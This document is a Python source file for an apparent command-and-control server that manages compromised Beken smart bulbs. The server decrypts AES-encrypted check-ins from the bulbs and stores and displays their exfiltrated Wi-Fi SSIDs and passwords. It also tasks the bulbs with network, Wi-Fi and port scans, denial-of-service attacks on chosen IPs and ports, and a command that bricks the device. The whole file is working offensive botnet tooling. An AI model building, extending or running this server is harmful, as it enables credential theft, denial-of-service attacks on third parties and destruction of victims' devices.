import os
import socket
import threading
import time
import sys
from Crypto.Cipher import AES

import logging

# --- CONFIGURATION ---
AES_KEY = b"lLwpwJEc6AZkmnm/fhrfHWhm7F7CZCOW" 
AES_BITS = 256
PORT = 8080
C2_PACKET_SIZE = 256
FULL_PACKET_SIZE = C2_PACKET_SIZE + 16
COMMAND_QUEUES = {} 
BULB_DATA_VAULT = {} 

# --- TYPE MAPPING (Matches C Macros Exactly) ---
# Format: "C_STRING": ("DISPLAY_NAME", "BEHAVIOR")
# Behaviors: "PARTIAL", "FINAL", "IMMEDIATE"
TYPE_MAP = {
    "hb":       ("HEARTBEAT", "IMMEDIATE"),
    "wifip":    ("WIFI_SCAN", "PARTIAL"),
    "wifif":    ("WIFI_SCAN", "FINAL"),
    "ipp":      ("IP_SCAN",   "PARTIAL"),
    "ipf":      ("IP_SCAN",   "FINAL"),
    "portp":    ("PORT_SCAN", "PARTIAL"),
    "portf":    ("PORT_SCAN", "FINAL"),
    "logp":     ("SYSTEM_LOG","PARTIAL"),
    "logf":     ("SYSTEM_LOG","FINAL"),
    "creds":    ("WIFI_CREDS", "IMMEDIATE"),
    "dos": 	    ("DOS_ATTACK", "PARTIAL")
}

# Configure the logger to write to a file
logging.basicConfig(
    filename='c2_vault.log',
    level=logging.INFO,
    format='%(message)s',
    datefmt='%H:%M:%S'
)

def log_to_file(msg):
    """Replacement for print() that sends data to the file only"""
    logging.info(msg)

# --- CRYPTO ---
def decrypt_message(data):
    try:
        # 1. Extract the IV from the first 16 bytes
        iv = data[:16]
        ciphertext = data[16:FULL_PACKET_SIZE] # The next 256 bytes

        # 2. Setup CBC Decipher
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        
        # 3. Decrypt and strip null padding
        decrypted = cipher.decrypt(ciphertext)
        return decrypted.decode('utf-8', errors='ignore').strip('\x00')
    except Exception as e:
        return f"Decryption Error: {e}"

def encrypt_message(message):
    # 1. Generate a random 16-byte IV
    iv = os.urandom(16)
    
    # 2. Setup CBC Cipher
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    
    # 3. Pad the message to exactly 256 bytes
    padded_msg = message.encode('utf-8').ljust(C2_PACKET_SIZE, b'\x00')
    
    # 4. Encrypt and prepend the IV
    ciphertext = cipher.encrypt(padded_msg)
    return iv + ciphertext

# --- CORE PROCESSING ---
def process_incoming_data(decrypted, timestamp, addr):
    try:
        # Expected: ID:001|TYPE:wifip|DATA:...
        parts = decrypted.split('|', 2)
        bulb_id = parts[0].split(':')[1]
        c_type = parts[1].split(':')[1].lower() 
        content = parts[2].split(':', 1)[1]
    except (IndexError, ValueError):
        log_to_file(f"[{timestamp}] Protocol Error: {decrypted}")
        return "UNKNOWN"

    if bulb_id not in BULB_DATA_VAULT:
        BULB_DATA_VAULT[bulb_id] = {}

    BULB_DATA_VAULT[bulb_id]["LAST_SEEN"] = time.strftime("%H:%M:%S")
    display_name, behavior = TYPE_MAP.get(c_type, (c_type.upper(), "IMMEDIATE"))

    # 1. PARTIAL BEHAVIOR (Drip-feeding the buffer)
    if behavior == "PARTIAL":
        buf_key = f"{display_name}_buffer"
        BULB_DATA_VAULT[bulb_id][buf_key] = BULB_DATA_VAULT[bulb_id].get(buf_key, "") + content
        # Still send a small log so we know it's working
        log_to_file(f"[{timestamp}] {bulb_id} -> {display_name} Drip...") 

    # 2. FINAL BEHAVIOR (Scan complete, parse and display)
    elif behavior == "FINAL":
        buf_key = f"{display_name}_buffer"
        final_payload = BULB_DATA_VAULT[bulb_id].get(buf_key, "") + content
        BULB_DATA_VAULT[bulb_id][display_name] = final_payload
        
        log_to_file(f"\n[{timestamp}] {bulb_id} -> {display_name} COMPLETE")
        
        # --- PORT SCAN FORMATTING ---
        if display_name == "PORT_SCAN":
            if "|" in final_payload:
                header, ports = final_payload.split("|", 1)
                target_ip = header.replace("TARGET:", "")
                log_to_file(f"--- Port Scan Results: {target_ip} ---")
                for p in ports.strip(";").split(";"):
                    if p: log_to_file(f"    [+] Port {p} is OPEN")
            else:
                log_to_file(f"    Raw Port Data: {final_payload}")

        # --- WIFI SCAN FORMATTING ---
        elif display_name == "WIFI_SCAN":
            log_to_file(f"{'SSID':<25} | {'BSSID':<18} | {'CH':<3} | {'RSSI':<4}")
            log_to_file("-" * 65)
            for net in final_payload.strip(";").split(";"):
                if "|" in net:
                    p = net.split("|")
                    log_to_file(f"{p[0]:<25} | {p[1]:<18} | {p[2]:<3} | {p[3]:<4}")

        # --- IP SCAN FORMATTING ---
        elif display_name == "IP_SCAN":
            log_to_file(f"--- Live Hosts Discovered ---")
            for host in final_payload.strip(";").split(";"):
                if host: log_to_file(f"    [+] {host}")
        
        BULB_DATA_VAULT[bulb_id][buf_key] = "" # Reset buffer for next scan

    # 3. IMMEDIATE BEHAVIOR (Heartbeats and basic commands)
    else:
        BULB_DATA_VAULT[bulb_id][display_name] = content
        if display_name == "WIFI_CREDS":
            BULB_DATA_VAULT[bulb_id]["LAST_STATUS"] = "CREDS_EXFILTRATED"
            # content looks like "SSID:MyNet;PASS:12345"
            parts = content.split(';')
            ssid = parts[0].split(':', 1)[1]
            password = parts[1].split(':', 1)[1]
            BULB_DATA_VAULT[bulb_id]["SSID"] = ssid
            BULB_DATA_VAULT[bulb_id]["PASSWORD"] = password
            log_to_file(f"\n[!] EXFILTRATED CREDENTIALS from {bulb_id}")
            log_to_file(f"    SSID: {ssid}")
            log_to_file(f"    PASS: {password}\n")
        elif display_name == "HEARTBEAT":
            BULB_DATA_VAULT[bulb_id]["LAST_STATUS"] = content
            # Shows: [18:05:12] 001 -> Status: SCANNING_PORTS
            log_to_file(f"[{timestamp}] {bulb_id} -> Status: {content}")
        else:
            log_to_file(f"[{timestamp}] {bulb_id} -> {display_name}: {content}")
    
    return bulb_id

# --- SERVER BOILERPLATE ---
def input_thread():
    print(f"[*] Commands: <ID> <CMD> | VIEW <ID> [TYPE]")
    sepLen = 100
    while True:
        line = sys.stdin.readline().strip()
        if not line: continue
        # --- HELP COMMAND ---
        if line.startswith("HELP") or line == "?":
            print("\n" + "="*sepLen)
            print("         BEKEN BULB C2 - COMMAND REFERENCE")
            print("="*sepLen)
            print(f"{'COMMAND':<40} | {'DESCRIPTION'}")
            print("-"*sepLen)
            #print(f"{'LIST':<40} | List all connected bulbs and their status")
            print(f"{'VIEW <ID>':<40} | Show dashboard summary for a specific bulb")
            print(f"{'VIEW <ID> <TYPE>':<40} | View raw data (IP_SCAN, WIFI_SCAN, etc.)")
            print("-"*sepLen)
            print(f"{'<ID> GET_CREDS':<40} | Force bulb to resend Wi-Fi credentials on next heartbeat")
            print(f"{'<ID> IP_SCAN':<40} | Task bulb to perform an IP Ping Sweep")
            print(f"{'<ID> WIFI_SCAN':<40} | Task bulb to perform a Wi-Fi Site Survey")
            print(f"{'<ID> PORT_SCAN <IP>':<40} | Task bulb to scan ports on a target IP")
            print(f"{'<ID> DOS_ATTACK <IP> <PORT> <DURATION>':<40} | Task bulb to perform a DoS attack")
            print(f"{'<ID> STOP_SCAN':<40} | Kill current scan and reset buffer")
            print(f"{'<ID> RESTART':<40} | Reboots the bulb")
            print(f"{'<ID> HARD_KILL':<40} | BRICK DEVICE (Requires reflash to recover)")
            print("-"*sepLen)
            print(f"{'HELP':<40} | Display this menu")
            print("="*sepLen + "\n")
            continue
        # --- Updated VIEW command ---
        elif line.startswith("VIEW"):
            parts = line.split(" ")
            if len(parts) < 2:
                print("[!] Usage: VIEW <ID> [OPTIONAL_TYPE]")
                continue
                
            target_id = parts[1]
            bulb_info = BULB_DATA_VAULT.get(target_id)
            
            if not bulb_info:
                print(f"[!] No data found for bulb {target_id}")
                continue

            if len(parts) == 3:
                # VIEW [ID] [TYPE]
                req_type = parts[2].upper()
                data = bulb_info.get(req_type)
                
                if data:
                    print(f"\n--- {target_id} | {req_type} ---")
                    
                    # Specialized Formatting for Port Scans
                    if req_type == "PORT_SCAN":
                        if "|" in data:
                            header, port_list = data.split("|", 1)
                            print(f"Target Host: {header.replace('TARGET:', '')}")
                            print("Open Ports:")
                            for p in port_list.strip(";").split(";"):
                                if p: print(f"  [+] {p}")
                        else:
                            print(f"  {data}")

                    # Standard Formatting for IP/WIFI Scans
                    elif "SCAN" in req_type:
                     # Generic Scan Listing (IP or WiFi)
                        if req_type == "WIFI_SCAN":
                        # Print Table Header
                            print(f"┃ {'SSID':<25} ┃ {'BSSID':<18} ┃ {'CH':<3} ┃ {'RSSI':<4} ┃")
                            print(f"┣{'━'*27}╋{'━'*20}╋{'━'*5}╋{'━'*6}┫")
                        
                            for net in data.strip(";").split(";"):
                                if "|" in net:
                                    p = net.split("|")
                                # Ensure we have all 4 parts before printing
                                    if len(p) == 4:
                                        print(f"┃ {p[0]:<25} ┃ {p[1]:<18} ┃ {p[2]:<3} ┃ {p[3]:<4} ┃")
                        else:
                        # Fallback for IP_SCAN or others
                            for entry in data.strip(";").split(";"):
                                if entry: print(f"┃ [+] {entry:<52} ┃")
                    
                    else:
                        print(f"    {data}")
                else:
                    available = [k for k in bulb_info.keys() if not k.endswith('_buffer')]
                    print(f"[!] Type '{req_type}' not found for bulb {target_id}")
                    print(f"    Available: {', '.join(available)}")
            
            else:
                status = bulb_info.get("LAST_STATUS", "UNKNOWN")
                last_time = bulb_info.get("LAST_SEEN", "N/A")
                ssid = bulb_info.get("SSID", "N/A")
                password = bulb_info.get("PASSWORD", "N/A")
                
                print(f"\n" + "═"*50)
                print(f" DEVICE DASHBOARD: {target_id}")
                print(f"═"*50)
                print(f" Current Activity : {status}")
                print(f" Last Check-in    : {last_time}")
                print(f"─"*50)
                
                # Highlighted Credentials Section
                print(f" NETWORK ACCESS:")
                print(f"  [*] SSID     : {ssid}")
                print(f"  [*] PASSWORD : {password}")
                print(f"─"*50)
                
                print(" DISCOVERY SUMMARY:")
                for key in ["IP_SCAN", "WIFI_SCAN", "PORT_SCAN"]:
                    val = bulb_info.get(key, "")
                    if val:
                        if key == "PORT_SCAN" and "|" in val:
                            target_ip = val.split("|")[0].replace("TARGET:", "")
                            print(f"  [+] {key:<12}: Active on {target_ip}")
                        else:
                            count = len(val.strip(";").split(";"))
                            print(f"  [+] {key:<12}: {count} entries")
                    else:
                        print(f"  [ ] {key:<12}: No data")
                
                print("═"*50)
                print(f"[*] Use 'VIEW {target_id} <TYPE>' for detailed lists.")
            continue

        elif "PORT_SCAN" in line.upper():
         # Usage: 001 PORT_SCAN 10.2.1.15
            try:
                parts = line.split(" ")
                tid = parts[0]
                target_ip = parts[2]
                cmd = f"PORT_SCAN|{target_ip}"
        
                COMMAND_QUEUES.setdefault(tid, []).append(cmd)
                print(f"[+] Tasked {tid} to Port Scan {target_ip}")
            except IndexError:
                print("[!] Usage: <ID> PORT_SCAN <TARGET_IP>")
        elif "DOS_ATTACK" in line:
            parts = line.split(" ")
            if len(parts) == 5:
                tid, _, ip, port, duration = parts
                cmd = f"DOS_ATTACK:{ip}|{port}|{duration}"
                COMMAND_QUEUES.setdefault(tid, []).append(cmd)
                print(f"[+] Tasked {tid} to DoS {ip}:{port} for {duration}s")
        # --- Standard Tasking ---
        elif " " in line:
            tid, cmd = line.split(" ", 1)
            COMMAND_QUEUES.setdefault(tid, []).append(cmd)
            print(f"[+] Tasked {tid}: {cmd}")

def start_server():
    threading.Thread(target=input_thread, daemon=True).start()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', PORT))
        s.listen(5)
        print(f"[*] C2 Server Active on Port {PORT}")

        while True:
            conn, addr = s.accept()
            with conn:
                # Must match FULL_PACKET_SIZE (272)
                raw = conn.recv(FULL_PACKET_SIZE) 
                if not raw or len(raw) < FULL_PACKET_SIZE: 
                    continue
                
                decrypted = decrypt_message(raw)
                active_id = process_incoming_data(decrypted, time.strftime("%H:%M:%S"), addr)
                
                # Command tasking
                q = COMMAND_QUEUES.get(active_id, [])
                response_text = q.pop(0) if q else "ACK"
                if(response_text != "ACK"):
                    log_to_file(f"[+] Sending Task to {active_id}: {response_text}")
                
                # Encrypt generates a 272-byte response
                conn.sendall(encrypt_message(response_text))

if __name__ == "__main__":
    start_server()